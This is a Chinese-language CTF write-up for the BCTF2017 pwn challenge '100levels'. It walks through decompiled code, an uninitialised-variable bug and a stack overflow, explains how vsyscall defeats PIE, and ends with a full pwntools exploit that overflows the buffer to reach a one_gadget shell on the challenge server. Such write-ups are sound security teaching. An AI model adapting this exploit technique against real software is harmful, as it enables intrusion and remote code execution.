---
layout: post
title:  100levels
date:   2021-02-19 00:01:01 +0300
image:  2021-02-19-city.jpg
tags:   [ctf,Pwn,adworld,BCTF2017,vsyscall]
---

#### checksec

```assembly
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

PIE保护

PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。

#### main()

```assembly
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax

  sub_DDC();
  sub_B69();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = sub_B00();
      if ( v3 != 2 )
        break;
      hint();
    }
    if ( v3 == 3 )
      break;
    if ( v3 == 1 )
      go();
    else
      puts("Wrong input");
  }
  giveUp();
  return 0LL;
}
```

#### menu()

```assembly
int sub_DA5()
{
  puts("1. Go");
  puts("2. Hint");
  puts("3. Give up");
  return puts("Choice:");
}
```

#### go()

```assembly
int go()
{
  int v1; // ST0C_4
  __int64 v2; // [rsp+0h] [rbp-120h]
  __int64 v3; // [rsp+0h] [rbp-120h]
  int v4; // [rsp+8h] [rbp-118h]
  __int64 v5; // [rsp+10h] [rbp-110h]
  signed __int64 v6; // [rsp+10h] [rbp-110h]
  signed __int64 v7; // [rsp+18h] [rbp-108h]
  __int64 v8; // [rsp+20h] [rbp-100h]

  puts("How many levels?");
  v2 = sub_B00();
  if ( v2 > 0 )
    v5 = v2;
  else
    puts("Coward");
  puts("Any more?");
  v3 = sub_B00();
  v6 = v5 + v3;
  if ( v6 > 0 )
  {
    if ( v6 <= 99 )
    {
      v7 = v6;
    }
    else
    {
      puts("You are being a real man.");
      v7 = 100LL;
    }
    puts("Let's go!'");
    v4 = time(0LL);
    if ( (unsigned int)sub_E43(v7) != 0 )
    {
      v1 = time(0LL);
      sprintf((char *)&v8, "Great job! You finished %d levels in %d seconds\n", v7, (unsigned int)(v1 - v4), v3);
      puts((const char *)&v8);
    }
    else
    {
      puts("You failed.");
    }
    exit(0);
  }
  return puts("Coward Coward Coward Coward Coward");
}
```

存在一个漏洞，如果v2<=0，v5是不会被初始化的。

#### sub_E43()

```assembly
_BOOL8 __fastcall sub_E43(signed int a1)
{
  int v2; // eax
  __int64 v3; // rax
  __int64 buf; // [rsp+10h] [rbp-30h]
  __int64 v5; // [rsp+18h] [rbp-28h]
  __int64 v6; // [rsp+20h] [rbp-20h]
  __int64 v7; // [rsp+28h] [rbp-18h]
  unsigned int v8; // [rsp+34h] [rbp-Ch]
  unsigned int v9; // [rsp+38h] [rbp-8h]
  unsigned int v10; // [rsp+3Ch] [rbp-4h]

  buf = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  if ( !a1 )
    return 1LL;
  if ( (unsigned int)sub_E43((unsigned int)(a1 - 1)) == 0 )
    return 0LL;
  v10 = rand() % a1;
  v2 = rand();
  v9 = v2 % a1;
  v8 = v2 % a1 * v10;
  puts("====================================================");
  printf("Level %d\n", (unsigned int)a1);
  printf("Question: %d * %d = ? Answer:", v10, v9);
  read(0, &buf, 0x400uLL);
  v3 = strtol((const char *)&buf, 0LL, 10);
  return v3 == v8;
}
```

buf存在栈溢出

#### hint()

```assembly
int sub_D06()
{
  signed __int64 v1; // [rsp+8h] [rbp-108h]
  int v2; // [rsp+10h] [rbp-100h]
  __int16 v3; // [rsp+14h] [rbp-FCh]

  if ( unk_20208C )
  {
    sprintf((char *)&v1, "Hint: %p\n", &system, &system);
  }
  else
  {
    v1 = 5629585671126536014LL;
    v2 = 1430659151;
    v3 = 78;
  }
  return puts((const char *)&v1);
}
```

如果满足某一条件则打印出system的地址

```assembly
>nc 111.200.241.244 44897
====================================================
 _  ___   ___    _                _
/ |/ _ \ / _ \  | | _____   _____| |___
| | | | | | | | | |/ _ \ \ / / _ \ / __|
| | |_| | |_| | | |  __/\ V /  __/ \__ \
|_|\___/ \___/  |_|\___| \_/ \___|_|___/

====================================================
1. Go
2. Hint
3. Give up
Choice:
2
NO PWN NO FUN
```

看来不满足if条件。

但是查看汇编

```assembly
.text:0000000000000D06 ; =============== S U B R O U T I N E ============================
.text:0000000000000D06
.text:0000000000000D06 ; Attributes: bp-based frame
.text:0000000000000D06
.text:0000000000000D06 hint            proc near               ; CODE XREF: main:loc_F9F↓p
.text:0000000000000D06
.text:0000000000000D06 var_110         = qword ptr -110h
.text:0000000000000D06 anonymous_0     = dword ptr -100h
.text:0000000000000D06 anonymous_1     = word ptr -0FCh
.text:0000000000000D06
.text:0000000000000D06 ; __unwind {
.text:0000000000000D06                 push    rbp
.text:0000000000000D07                 mov     rbp, rsp
.text:0000000000000D0A                 sub     rsp, 110h
.text:0000000000000D11                 mov     rax, cs:system_ptr
.text:0000000000000D18                 mov     [rbp+var_110], rax
.text:0000000000000D1F                 lea     rax, unk_20208C
.text:0000000000000D26                 mov     eax, [rax]
.text:0000000000000D28                 test    eax, eax
.text:0000000000000D2A                 jz      short loc_D57
.text:0000000000000D2C                 mov     rax, [rbp+var_110]
.text:0000000000000D33                 lea     rdx, [rbp+var_110]
.text:0000000000000D3A                 lea     rcx, [rdx+8]
.text:0000000000000D3E                 mov     rdx, rax
.text:0000000000000D41                 lea     rsi, aHintP     ; "Hint: %p\n"
.text:0000000000000D48                 mov     rdi, rcx        ; s
.text:0000000000000D4B                 mov     eax, 0
.text:0000000000000D50                 call    _sprintf
.text:0000000000000D55                 jmp     short loc_D7C
.text:0000000000000D57 ; ----------------------------------------------------------------
.text:0000000000000D57
.text:0000000000000D57 loc_D57:                                ; CODE XREF: hint+24↑j
.text:0000000000000D57                 lea     rax, [rbp+var_110]
.text:0000000000000D5E                 add     rax, 8
.text:0000000000000D62                 mov     rsi, 4E204E5750204F4Eh
.text:0000000000000D6C                 mov     [rax], rsi
.text:0000000000000D6F                 mov     dword ptr [rax+8], 5546204Fh
.text:0000000000000D76                 mov     word ptr [rax+0Ch], 4Eh ; 'N'
.text:0000000000000D7C
.text:0000000000000D7C loc_D7C:                                ; CODE XREF: hint+4F↑j
.text:0000000000000D7C                 lea     rax, [rbp+var_110]
.text:0000000000000D83                 add     rax, 8
.text:0000000000000D87                 mov     rdi, rax        ; s
.text:0000000000000D8A                 call    _puts
.text:0000000000000D8F                 nop
.text:0000000000000D90                 leave
.text:0000000000000D91                 retn
.text:0000000000000D91 ; } // starts at D06
.text:0000000000000D91 hint            endp
```

函数开头部分会将system的地址放入栈中，

```assembly
.text:0000000000000D11                 mov     rax, cs:system_ptr
.text:0000000000000D18                 mov     [rbp+var_110], rax
```

system函数的地址被放到了rbp-110h的地方，而go函数中v5变量的位置正好就是rbp-110h。

所以我们可以首先将system函数的地址保存在栈上，利用go函数中的第二次输入将栈上的system地址改为onegadget的地址。再利用栈溢出使程序返回到onegadget处。但是开启了PIE保护，意味着我们不知道程序执行时候的真实地址，所以用到了vsyscall。

vsyscall是一种也是最古老的一种用于加快系统调用的机制，工作原理十分简单，许多硬件上的操作都会被包装成内核函数，然后提供一个接口，供用户层代码调用，这个接口就是我们常用的int 0x80和syscall+调用号。
当通过这个接口来调用时，由于需要进入到内核去处理，因此为了保证数据的完整性，需要在进入内核之前把寄存器的状态保存好，然后进入到内核状态运行内核函数，当内核函数执行完的时候会将返回结果放到相应的寄存器和内存中，然后再对寄存器进行恢复，转换到用户层模式。
这一过程需要消耗一定的性能，对于某些经常被调用的系统函数来说，肯定会造成很大的内存浪费，因此，系统把几个常用的内核调用从内核中映射到用户层空间中，从而引入了vsyscall

vsyscall 的内存页的位置在任何时刻都是相同的，值为 0xFFFFFFFFFF600000。那怕程序开启了pie， vsyscall的地址还是不变的，而且这三个系统调用对程序运行基本没有影响，也就是说我们获得了三个已知地址的ret gadget。

```assembly
gettimeofday: 0xffffffffff600000
time:         0xffffffffff600000
getcpu:       0xffffffffff600000
```

通过对栈分析，我们需要3个ret之后rsp才会指向布置好的onegadget地址。

#### exp:

```assembly
from pwn import *

elf = ELF("./100levels")
# context.log_level = "debug"

libc = ELF("./libc.so")

io = remote("111.200.241.244",44897)

def go(levels, more):
    io.recvuntil("Choice:")
    io.sendline(str(1))
    io.recvuntil("How many levels?")
    io.sendline(str(levels))
    io.recvuntil("Any more?")
    io.sendline(str(more))

def hint():
    io.recvuntil("Choice:")
    io.sendline(str(2))

def giveUp():
    io.recvuntil("Choice:")
    io.sendline(str(3))

def calc():
    io.recvuntil("Question: ")
    num1 = io.recvuntil(" * ")[:-3]
    print(num1)
    num2 = io.recvuntil(" = ")[:-3]
    print(num2)
    io.recvuntil("Answer:")
    io.sendline(str(int(num1)*int(num2)))

'''
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = [0x4526a, 0xef6c4, 0xf0567]
system = libc.symbols["system"]
offset = one_gadget[0] - system

hint()
go(0, offset)
for i in range(0, 99):
    calc()

io.recvuntil("Answer:")
payload = "a"*(0x30 + 8) + p64(0xffffffffff600000)*3
io.send(payload)


io.interactive()
```

